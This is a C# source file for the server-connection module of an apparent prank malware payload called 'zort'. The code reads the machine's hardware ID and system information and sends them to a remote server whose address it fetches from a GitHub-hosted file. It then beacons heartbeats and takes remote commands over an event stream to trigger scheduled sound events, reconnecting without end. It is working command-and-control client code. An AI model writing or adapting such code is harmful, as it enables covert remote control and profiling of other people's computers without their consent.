using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using zort.Properties;

namespace zort
{
    public class ServerCon : IPayloadModule
    {
        private const string DEFAULT_SERVER_URL = "localhost:2256";
        private readonly Thread ServerThread = new Thread(ServerRoutine);

        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "ServerConnection";

        public void Start()
        {
            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            ServerThread.Start();
        }

        public void Stop()
        {
            if (ServerThread.IsAlive)
            {
                ServerThread.Abort();
            }
        }
        private static async void ServerRoutine()
        {
        uwu:
            try
            {
                List<Zort.FartSchedule> fartsAccountedFor = new List<Zort.FartSchedule>();
                string hwid = SysInfoHelper.HWID();
                SystemInfo systemInfo = SysInfoHelper.Get();
                string serverUrl = await GetServerUrlAsync();

                using (HttpClient client = CreateHttpClient())
                {
                    await SendSystemInfoWithRetryAsync(client, serverUrl, hwid, systemInfo);
                    var sseTask = Task.Run(() => RunSseWithAutoRestartAsync(serverUrl, hwid));
                    while (true)
                    {
                        await SendHeartbeatAsync(client, serverUrl, hwid);
                        await Task.Delay(5000);
                    }
                }
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(typeof(ServerCon), $"Error in server routine: {ex.Message}");
                Thread.Sleep(5000);
                goto uwu;
            }
        }

        private static async Task RunSseWithAutoRestartAsync(string serverUrl, string hwid)
        {
            while (true)
            {
                try
                {
                    await ListenForFartEventsAsync(serverUrl, hwid);
                }
                catch (Exception ex)
                {
                    ModuleLogger.Log(typeof(ServerCon), $"SSE listener crashed: {ex.Message}. Restarting in 3 seconds...");
                    await Task.Delay(3000);
                }
            }
        }

        private static HttpClient CreateHttpClient()
        {
            var handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) =>
                {
                    var trustedCert = new X509Certificate2(Resources.cert);
                    return sslPolicyErrors == SslPolicyErrors.None || cert.Equals(trustedCert);
                }
            };
            return new HttpClient(handler);
        }

        private static async Task<string> GetServerUrlAsync()
        {
            const string githubUrl = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
            const string defaultServerUrl = "https://localhost:2256";

            using (var client = new HttpClient())
            {
                try
                {
                    var response = await client.GetAsync(githubUrl);
                    if (response.IsSuccessStatusCode)
                    {
                        //Add http:// to the URL if it doesn't already exist
                        string serverUrl = await response.Content.ReadAsStringAsync();
                        if (!serverUrl.StartsWith("http://") && !serverUrl.StartsWith("https://"))
                        {
                            serverUrl = "https://" + serverUrl;
                        }

                        // Check if the URL is valid
                        var uri = new Uri(serverUrl);
                        if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
                        {
                            ModuleLogger.Log(typeof(ServerCon), "Invalid server URL scheme.");
                            return defaultServerUrl;
                        }
                        return serverUrl;
                    }
                    else
                        ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
                }
                catch (Exception ex)
                {
                    ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL from GitHub: {ex.Message}");
                }
            }
            return defaultServerUrl;
        }

        private static async Task SendSystemInfoWithRetryAsync(HttpClient client, string serverUrl, string hwid, SystemInfo info)
        {
            while (true)
            {
                var response = await SendRequestAsync(serverUrl, "/log", new { hwid, sysdata = JsonConvert.SerializeObject(info) }, client);
                if (response != null && response.IsSuccessStatusCode)
                {
                    ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
                    break;
                }

                ModuleLogger.Log(typeof(ServerCon), "Failed to send system info. Retrying in 5 seconds...");
                await Task.Delay(5000);
            }
        }

        private static async Task SendHeartbeatAsync(HttpClient client, string serverUrl, string hwid)
        {
            var response = await SendRequestAsync(serverUrl, "/heartbeat", new { hwid }, client);
            if (response != null && response.IsSuccessStatusCode)
            {
                ModuleLogger.Log(typeof(ServerCon), "Heartbeat sent successfully.");
            }
            else
            {
                ModuleLogger.Log(typeof(ServerCon), "Failed to send heartbeat.");
            }
        }

        private static async Task ListenForFartEventsAsync(string serverUrl, string hwid)
        {
            var fartsAccountedFor = new List<Zort.FartSchedule>();
            ModuleLogger.Log(typeof(ServerCon), "Initialized fartsAccountedFor list.");

            var request = new HttpRequestMessage(HttpMethod.Get, $"{serverUrl}/events?hwid={WebUtility.UrlEncode(hwid)}");
            ModuleLogger.Log(typeof(ServerCon), $"Created HTTP request for SSE: {request.RequestUri}");
            request.Headers.Accept.Clear();
            request.Headers.Accept.ParseAdd("text/event-stream");

            using (var client = CreateHttpClient())
            using (var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead))
            using (var stream = await response.Content.ReadAsStreamAsync())
            using (var reader = new StreamReader(stream))
            {
                if (!response.IsSuccessStatusCode)
                {
                    ModuleLogger.Log(typeof(ServerCon), $"SSE connection failed with status: {response.StatusCode}");
                    return;
                }
                ModuleLogger.Log(typeof(ServerCon), "SSE connection established successfully.");

                while (!reader.EndOfStream)
                {
                    var line = await reader.ReadLineAsync();
                    if (string.IsNullOrWhiteSpace(line) || !line.StartsWith("data:")) continue;

                    string json = line.Substring(5).Trim();
                    ModuleLogger.Log(typeof(ServerCon), $"Received SSE data: {json}");
                    try
                    {
                        dynamic jObj = JsonConvert.DeserializeObject(json);
                        if (jObj?.type == null || jObj?.timestamp == null || jObj?.volume == null) continue;

                        var fartSchedule = new Zort.FartSchedule
                        {
                            Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), (string)jObj.type, true),
                            Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)jObj.timestamp).UtcDateTime,
                            Volume = (int)jObj.volume,
                        };
                        ModuleLogger.Log(typeof(ServerCon), $"Parsed FartSchedule: Type={fartSchedule.Type}, Timestamp={fartSchedule.Timestamp}");

                        if (!fartsAccountedFor.Any(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type))
                        {
                            Zort.ScheduledFart(fartSchedule);
                            fartsAccountedFor.Add(fartSchedule);
                        }
                        else
                        {
                            ModuleLogger.Log(typeof(ServerCon), $"Duplicate fart ignored: Type={fartSchedule.Type}, Timestamp={fartSchedule.Timestamp}");
                        }
                    }
                    catch (JsonException ex)
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"Failed to parse SSE fart data: {ex.Message}");
                    }
                    catch(OperationAbortedException ex)
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"SSE connection aborted: {ex.Message}");
                        break;
                    }
                    catch (Exception ex)
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"Unexpected error in SSE loop: {ex.Message}");
                    }
                }
            }
        }

        private static async Task FartPollingLoopAsync(HttpClient client, string serverUrl, string hwid, List<Zort.FartSchedule> fartsAccountedFor)
        {
            while (true)
            {
                var response = await SendRequestAsync(serverUrl, "/getFarts", new { hwid }, client);

                if (response == null || !response.IsSuccessStatusCode)
                {
                    ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts.");
                }
                else
                {
                    await HandleFartScheduleResponseAsync(response, fartsAccountedFor);
                }

                await SendRequestAsync(serverUrl, "/heartbeat", new { hwid }, client);
                await Task.Delay(2500);
            }
        }

        private static async Task HandleFartScheduleResponseAsync(HttpResponseMessage response, List<Zort.FartSchedule> fartsAccountedFor)
        {
            try
            {
                var jsonResponse = await response.Content.ReadAsStringAsync();
                dynamic jObj = JsonConvert.DeserializeObject(jsonResponse);

                if (jObj?.farts == null)
                {
                    ModuleLogger.Log(typeof(ServerCon), "No scheduled farts found.");
                    return;
                }

                var scheduledFarts = new List<Zort.FartSchedule>();

                foreach (var fart in jObj.farts)
                {
                    var fartSchedule = new Zort.FartSchedule
                    {
                        Type = (Zort.FartType)Enum.Parse(typeof(Zort.FartType), (string)fart.type, true),
                        Timestamp = DateTimeOffset.FromUnixTimeSeconds((long)fart.timestamp).UtcDateTime
                    };
                    scheduledFarts.Add(fartSchedule);
                }

                foreach (var fartSchedule in scheduledFarts)
                {
                    if (!fartsAccountedFor.Any(f => f.Timestamp == fartSchedule.Timestamp && f.Type == fartSchedule.Type))
                    {
                        Zort.ScheduledFart(fartSchedule);
                        fartsAccountedFor.Add(fartSchedule);
                    }
                }
            }
            catch (JsonException ex)
            {
                ModuleLogger.Log(typeof(ServerCon), $"Failed to parse scheduled farts: {ex.Message}");
            }
        }



        static async Task<HttpResponseMessage> SendRequestAsync(string url, string endpoint, dynamic data, HttpClient client)
        {
            try
            {
                // Construct the URL with query parameters from the data object
                var requestUrl = $"{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
                foreach (var property in data.GetType().GetProperties())
                {
                    requestUrl += $"{property.Name}={property.GetValue(data)}&";
                }
                requestUrl = requestUrl.TrimEnd('&');

                // Send the POST request
                HttpResponseMessage response = await client.GetAsync(requestUrl);
                return response;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine($"Request error: {ex.Message}");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return null;
            }
        }
    }
}
